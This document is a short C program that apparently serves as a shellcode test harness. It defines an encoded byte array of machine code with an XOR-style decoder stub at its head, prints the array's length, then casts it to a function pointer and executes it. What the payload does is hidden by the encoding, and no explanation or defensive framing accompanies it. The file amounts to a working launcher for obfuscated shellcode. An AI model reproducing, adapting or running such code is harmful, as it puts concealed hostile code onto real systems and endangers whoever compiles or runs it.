#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xbe\x55\x64\x92\x92\xd9\xc2\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x0d\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\xb7\x91\xa3\x49\x64"
"\x19\x97\x07\x88\xf7\x71\x80\x05\xe6\xb3\xb0\x82\xb2\x23\xbb"
"\xac\x46\xbb\xdd\xc4\x61\xcc\x47\x47\xe7\x33\xed\x01\xaf\xe3"
"\xa3\x9a\xc6\xe5\x07\xe9\x59\xbe\x1e\x47\x55\xf1\x22\x6a\xe6"
"\x0e\xc5";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
